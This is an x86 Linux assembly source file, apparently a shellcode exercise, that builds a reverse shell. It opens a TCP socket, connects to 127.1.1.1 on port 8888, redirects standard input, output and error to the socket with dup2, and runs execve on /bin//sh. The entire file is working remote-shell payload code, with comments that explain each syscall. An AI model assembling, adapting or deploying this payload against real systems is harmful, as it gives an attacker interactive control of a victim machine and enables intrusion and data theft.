global _start

section .text
_start:

;###socket###
;socket(AF_INET , SOCK_STREAM , 0);

xor eax, eax
mov al, 0x66 ;socketcall
xor ebx, ebx
mov bl, 0x01 ;socket function

;push the list of arguments onto the stack
push 0x00 ;PROT
push 0x01 ;SOCK_STREAM
push 0x02 ;AF_INET

mov ecx, esp ;pass the pointer to the list of arguments to ecx

int 0x80
mov edi, eax ; save socket fd into edi (eax may change!)

;###connect ###

;struct sockaddr_in {
;	unsigned short  sin_family;     /*  Internet protocol (AF_INET) */
;	unsigned short  sin_port;       /* Address port (16 bits) */
;	struct in_addr sin_addr;        /*  Internet address (32 bits) */
;	char sin_zero[8];               /* Not used */
;};
;
;struct in_addr {
;	unsigned long s_addr;  // load with inet_aton()
;};
push 0x0101017f 
push word 0xb822 ; sin_port=8888 
push word 0x02

mov esi, esp ;save the pointer to the struct in esi

; connect syscall
;int connect(int socket, struct sockaddr *foreignAddress, unsigned int addressLength)
xor eax, eax
mov eax, 0x66 ; socketcall
xor ebx, ebx
mov ebx, 0x03 ; connect

push 0x10 ; addressLength=16bytes. short+short+8+long=2+2+8+4=16
push esi ; address of the struct 
push edi ; socket fd

mov ecx, esp ;pass the pointer to the list of arguments to ecx
int 0x80

;###copy file descriptors###
;dup2(sock, 0);
;dup2(sock, 1);
;dup2(sock, 2);

mov eax, 0x3f ;dup2
mov ecx, edi
mov ebx, 0x0

int 0x80

mov eax, 0x3f ;dup2
mov ebx, 0x1
mov ecx, edi

int 0x80

mov eax, 0x3f ;dup2
mov ebx, 0x2
mov ecx, edi

int 0x80

;###execve###
xor eax, eax
mov al, 0x0b ;sys_execve
xor ebx, ebx 
push ebx ;terminate string with \0
push 0x68732f2f ;String "hs//"
push 0x6e69622f;String "nib/"
mov ebx, esp

xor ecx, ecx
xor edx, edx

int 0x80
